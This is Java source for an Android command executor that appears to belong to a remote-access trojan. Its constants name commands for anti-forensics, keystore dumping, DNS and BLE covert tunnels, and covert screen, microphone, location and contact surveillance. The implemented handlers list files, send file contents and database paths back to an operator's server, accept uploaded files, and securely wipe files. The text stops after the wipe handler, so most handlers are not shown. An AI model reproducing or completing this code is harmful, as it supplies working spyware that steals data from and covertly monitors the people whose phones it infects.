/**
 * BinaryCommandExecutor - Elite Research Binary Protocol Handler
 * Maps every BinaryCmdType to its Android implementation.
 *
 * Protocol wire format (matches BinaryPacket.cs / EliteServerManager.cs):
 *   [MAGIC:1=0xB1][VERSION:1][TYPE:1][LEN:4 LE][PAYLOAD:N]
 *
 * BinaryCmdType (from BinaryCommand.cs):
 *  Core File Navigation  : 0x01-0x06
 *  Anti-Forensics        : 0x10-0x13
 *  Native Exploitation   : 0x20-0x23
 *  Covert Channels       : 0x30-0x34
 *  Surveillance          : 0x40-0x43
 *  Input Injection       : 0x50-0x51
 */
public class BinaryCommandExecutor {

    private static final String TAG = "BinExec";

    // ─── Protocol constants (MUST match EliteServerManager.cs) ────────────────
    public static final byte MAGIC       = (byte) 0xB1;
    public static final byte VERSION     = 0x01;
    public static final byte TYPE_RESULT = 0x30; // generic result back to server
    public static final byte TYPE_FILE   = 0x02; // file transfer
    public static final byte TYPE_STREAM = 0x40; // media stream chunk

    // ─── BinaryCmdType constants ──────────────────────────────────────────────
    // [0x01 - 0x06] Core File Navigation
    public static final byte CMD_RECURSIVE_GHOST_LIST  = 0x01;
    public static final byte CMD_DOWNLOAD_FILE_BINARY  = 0x02;
    public static final byte CMD_UPLOAD_FILE_BINARY    = 0x03;
    public static final byte CMD_SEARCH_SENSITIVE_DB   = 0x04;
    public static final byte CMD_COMPRESS_ZIP          = 0x05;
    public static final byte CMD_DECOMPRESS_ZIP        = 0x06;

    // [0x10 - 0x13] Anti-Forensics & Stealth
    public static final byte CMD_PHYSICAL_WIPE_NATIVE  = 0x10;
    public static final byte CMD_WIPE_JOURNAL_LOGS     = 0x11;
    public static final byte CMD_PROTECT_PROCESS_OOM   = 0x12;
    public static final byte CMD_SELF_DESTRUCT_NATIVE  = 0x13;

    // [0x20 - 0x23] Native Exploitation & Injection
    public static final byte CMD_NATIVE_SHELL_EXEC     = 0x20;
    public static final byte CMD_INJECT_SO_LIBRARY     = 0x21;
    public static final byte CMD_MEMORY_DUMP_KEYSTORE  = 0x22;
    public static final byte CMD_HOOK_CRYPTO_RUNTIME   = 0x23;

    // [0x30 - 0x34] Covert Channels & OOB
    public static final byte CMD_DNS_DATA_TUNNELING    = 0x30;
    public static final byte CMD_L2CAP_BLE_TUNNEL      = 0x31;
    public static final byte CMD_THREAD_MESH_BRIDGE    = 0x32;
    public static final byte CMD_INTERCEPT_APP_TRAFFIC = 0x33;
    public static final byte CMD_BYPASS_FILE_SANDBOX   = 0x34;

    // [0x40 - 0x43] Surveillance & Intelligence
    public static final byte CMD_SCREEN_MIRROR_NATIVE  = 0x40;
    public static final byte CMD_MIC_STREAM_JNI        = 0x41;
    public static final byte CMD_LOCATION_SILENT_TRACE = 0x42;
    public static final byte CMD_DUMP_CONTACTS_SECURE  = 0x43;

    // [0x50 - 0x51] Input Injection (Elite Control)
    public static final byte CMD_INPUT_TOUCH_EVENT     = 0x50;
    public static final byte CMD_INPUT_KEY_EVENT       = 0x51;

    // ──────────────────────────────────────────────────────────────────────────
    private final Context ctx;
    private final DataOutputStream out;
    private final ExecutorService executor;
    private volatile boolean isRecordingMic = false;
    private volatile boolean isStreamingScreen = false;

    public BinaryCommandExecutor(Context ctx, DataOutputStream out, ExecutorService executor) {
        this.ctx      = ctx;
        this.out      = out;
        this.executor = executor;
    }

    // ══════════════════════════════════════════════════════════════════════════
    //  DISPATCHER  -  routes every incoming binary command
    // ══════════════════════════════════════════════════════════════════════════
    public void dispatch(byte cmdType, byte[] payload) {
        try {
            String payloadStr = payload != null ? new String(payload, "UTF-8") : "";
            switch (cmdType) {

                // ─── File Navigation ─────────────────────────────────────────
                case CMD_RECURSIVE_GHOST_LIST:
                    handleGhostList(payloadStr); break;

                case CMD_DOWNLOAD_FILE_BINARY:
                    handleDownloadFile(payloadStr); break;

                case CMD_UPLOAD_FILE_BINARY:
                    handleUploadFile(payload); break;

                case CMD_SEARCH_SENSITIVE_DB:
                    handleSearchSensitiveDB(payloadStr); break;

                case CMD_COMPRESS_ZIP:
                    handleCompressZip(payloadStr); break;

                case CMD_DECOMPRESS_ZIP:
                    handleDecompressZip(payloadStr); break;

                // ─── Anti-Forensics ──────────────────────────────────────────
                case CMD_PHYSICAL_WIPE_NATIVE:
                    handlePhysicalWipe(payloadStr); break;

                case CMD_WIPE_JOURNAL_LOGS:
                    handleWipeJournalLogs(); break;

                case CMD_PROTECT_PROCESS_OOM:
                    handleProtectProcessOOM(); break;

                case CMD_SELF_DESTRUCT_NATIVE:
                    handleSelfDestruct(); break;

                // ─── Native Exploitation ─────────────────────────────────────
                case CMD_NATIVE_SHELL_EXEC:
                    handleNativeShell(payloadStr); break;

                case CMD_INJECT_SO_LIBRARY:
                    handleInjectSoLibrary(payload); break;

                case CMD_MEMORY_DUMP_KEYSTORE:
                    handleMemoryDumpKeystore(); break;

                case CMD_HOOK_CRYPTO_RUNTIME:
                    handleHookCryptoRuntime(payloadStr); break;

                // ─── Covert Channels ─────────────────────────────────────────
                case CMD_DNS_DATA_TUNNELING:
                    handleDnsTunneling(payloadStr); break;

                case CMD_L2CAP_BLE_TUNNEL:
                    handleBleTunnel(payloadStr); break;

                case CMD_THREAD_MESH_BRIDGE:
                    handleThreadMeshBridge(payloadStr); break;

                case CMD_INTERCEPT_APP_TRAFFIC:
                    handleInterceptTraffic(payloadStr); break;

                case CMD_BYPASS_FILE_SANDBOX:
                    handleBypassSandbox(payloadStr); break;

                // ─── Surveillance ────────────────────────────────────────────
                case CMD_SCREEN_MIRROR_NATIVE:
                    handleScreenMirror(payloadStr); break;

                case CMD_MIC_STREAM_JNI:
                    handleMicStream(payloadStr); break;

                case CMD_LOCATION_SILENT_TRACE:
                    handleLocationTrace(payloadStr); break;

                case CMD_DUMP_CONTACTS_SECURE:
                    handleDumpContacts(); break;

                // ─── Input Injection ─────────────────────────────────────────
                case CMD_INPUT_TOUCH_EVENT:
                    handleTouchEvent(payloadStr); break;

                case CMD_INPUT_KEY_EVENT:
                    handleKeyEvent(payloadStr); break;

                default:
                    sendResult("UNKNOWN_CMD:" + String.format("0x%02X", cmdType));
                    break;
            }
        } catch (Exception e) {
            Log.e(TAG, "Dispatch error: " + e.getMessage());
            try { sendResult("ERROR:" + e.getMessage()); } catch (Exception ignored) {}
        }
    }

    // ══════════════════════════════════════════════════════════════════════════
    //  [0x01] RECURSIVE_GHOST_LIST - list files bypassing MediaStore
    // ══════════════════════════════════════════════════════════════════════════
    private void handleGhostList(String path) throws Exception {
        if (path == null || path.isEmpty()) path = "/sdcard";
        File root = new File(path);
        JSONArray arr = new JSONArray();
        listFilesRecursive(root, arr, 0, 5);
        sendResult("FILE_LIST:" + arr.toString());
    }

    private void listFilesRecursive(File dir, JSONArray arr, int depth, int maxDepth) {
        if (!dir.exists() || depth > maxDepth) return;
        File[] files = dir.listFiles();
        if (files == null) return;
        for (File f : files) {
            try {
                JSONObject o = new JSONObject();
                o.put("name", f.getName());
                o.put("path", f.getAbsolutePath());
                o.put("size", f.isFile() ? f.length() : 0);
                o.put("dir",  f.isDirectory());
                o.put("mod",  f.lastModified());
                arr.put(o);
                if (f.isDirectory()) listFilesRecursive(f, arr, depth + 1, maxDepth);
            } catch (Exception ignored) {}
        }
    }

    // ══════════════════════════════════════════════════════════════════════════
    //  [0x02] DOWNLOAD_FILE_BINARY - chunked binary file download
    // ══════════════════════════════════════════════════════════════════════════
    private void handleDownloadFile(String path) throws Exception {
        File f = new File(path);
        if (!f.exists() || !f.isFile()) { sendResult("ERROR:FILE_NOT_FOUND:" + path); return; }
        byte[] nameBytes = f.getName().getBytes("UTF-8");
        byte[] content   = readFileBytes(f);

        // Frame: [NameLen:4 LE][Name][Content]
        java.nio.ByteBuffer buf = java.nio.ByteBuffer.allocate(4 + nameBytes.length + content.length);
        buf.order(java.nio.ByteOrder.LITTLE_ENDIAN);
        buf.putInt(nameBytes.length);
        buf.put(nameBytes);
        buf.put(content);

        sendPacket(TYPE_FILE, buf.array());
        Log.d(TAG, "File sent: " + path + " (" + content.length + " bytes)");
    }

    // ══════════════════════════════════════════════════════════════════════════
    //  [0x03] UPLOAD_FILE_BINARY - receive file from server
    // ══════════════════════════════════════════════════════════════════════════
    private void handleUploadFile(byte[] raw) throws Exception {
        if (raw == null || raw.length < 5) { sendResult("ERROR:EMPTY_UPLOAD"); return; }
        java.nio.ByteBuffer buf = java.nio.ByteBuffer.wrap(raw).order(java.nio.ByteOrder.LITTLE_ENDIAN);
        int nameLen = buf.getInt();
        byte[] nameBytes = new byte[nameLen];
        buf.get(nameBytes);
        String fileName = new String(nameBytes, "UTF-8");
        byte[] content  = new byte[raw.length - 4 - nameLen];
        buf.get(content);

        File dest = new File(ctx.getExternalFilesDir(null), fileName);
        try (FileOutputStream fos = new FileOutputStream(dest)) { fos.write(content); }
        sendResult("UPLOAD_OK:" + dest.getAbsolutePath() + ":" + content.length);
    }

    // ══════════════════════════════════════════════════════════════════════════
    //  [0x04] SEARCH_SENSITIVE_DB - find SQLite/Realm databases
    // ══════════════════════════════════════════════════════════════════════════
    private void handleSearchSensitiveDB(String rootPath) throws Exception {
        if (rootPath == null || rootPath.isEmpty()) rootPath = "/data/data";
        List<String> found = new ArrayList<>();
        searchForDatabases(new File(rootPath), found, 0, 6);
        JSONArray arr = new JSONArray();
        for (String s : found) arr.put(s);
        sendResult("DB_LIST:" + arr.toString());
    }

    private void searchForDatabases(File dir, List<String> found, int depth, int max) {
        if (!dir.exists() || depth > max) return;
        File[] files = dir.listFiles();
        if (files == null) return;
        for (File f : files) {
            String n = f.getName().toLowerCase();
            if (f.isFile() && (n.endsWith(".db") || n.endsWith(".sqlite") || n.endsWith(".realm"))) {
                found.add(f.getAbsolutePath());
            } else if (f.isDirectory()) {
                searchForDatabases(f, found, depth + 1, max);
            }
        }
    }

    // ══════════════════════════════════════════════════════════════════════════
    //  [0x05] COMPRESS_ZIP
    // ══════════════════════════════════════════════════════════════════════════
    private void handleCompressZip(String payload) throws Exception {
        JSONObject p = new JSONObject(payload);
        String src  = p.getString("src");
        String dest = p.optString("dest", src + ".zip");
        zipFolder(new File(src), new File(dest));
        sendResult("ZIP_OK:" + dest);
    }

    private void zipFolder(File src, File dest) throws IOException {
        try (ZipOutputStream zos = new ZipOutputStream(new FileOutputStream(dest))) {
            zipAdd(src, src.getName(), zos);
        }
    }

    private void zipAdd(File file, String name, ZipOutputStream zos) throws IOException {
        if (file.isDirectory()) {
            File[] children = file.listFiles();
            if (children != null) for (File child : children) zipAdd(child, name + "/" + child.getName(), zos);
        } else {
            zos.putNextEntry(new ZipEntry(name));
            try (FileInputStream fis = new FileInputStream(file)) {
                byte[] buf = new byte[8192];
                int r;
                while ((r = fis.read(buf)) > 0) zos.write(buf, 0, r);
            }
            zos.closeEntry();
        }
    }

    // ══════════════════════════════════════════════════════════════════════════
    //  [0x06] DECOMPRESS_ZIP
    // ══════════════════════════════════════════════════════════════════════════
    private void handleDecompressZip(String payload) throws Exception {
        JSONObject p  = new JSONObject(payload);
        String src    = p.getString("src");
        String destDir= p.optString("dest", new File(src).getParent());
        try (ZipInputStream zis = new ZipInputStream(new FileInputStream(src))) {
            ZipEntry entry;
            while ((entry = zis.getNextEntry()) != null) {
                File out = new File(destDir, entry.getName());
                if (entry.isDirectory()) { out.mkdirs(); continue; }
                out.getParentFile().mkdirs();
                try (FileOutputStream fos = new FileOutputStream(out)) {
                    byte[] buf = new byte[8192]; int r;
                    while ((r = zis.read(buf)) > 0) fos.write(buf, 0, r);
                }
                zis.closeEntry();
            }
        }
        sendResult("UNZIP_OK:" + destDir);
    }

    // ══════════════════════════════════════════════════════════════════════════
    //  [0x10] PHYSICAL_WIPE_NATIVE - 7-pass overwrite
    // ══════════════════════════════════════════════════════════════════════════
    private void handlePhysicalWipe(String path) {
        executor.execute(() -> {
            try {
                File f = new File(path);
                if (!f.exists() || !f.isFile()) { sendResult("WIPE_ERROR:NOT_FOUND"); return; }
                long size = f.length();
                byte[][] patterns = { new byte[]{(byte)0x00}, new byte[]{(byte)0xFF},
                        new byte[]{(byte)0xAA}, new byte[]{(byte)0x55},
                        new byte[]{(byte)0x92}, new byte[]{(byte)0x49},
                        new byte[]{(byte)0x24} };
                try (FileOutputStream fos = new FileOutputStream(f)) {
                    for (byte[] pat : patterns) {
                        fos.getChannel().position(0);
                        for (long i = 0; i < size; i++) fos.write(pat);
                        fos.flush();
                    }
                }
                f.delete();
                sendResult("WIPE_OK:" + path);
            } catch (Exception e) {
                try { sendResult("WIPE_ERROR:" + e.getMessage()); } catch (Exception ignored) {}
            }
        });
    }

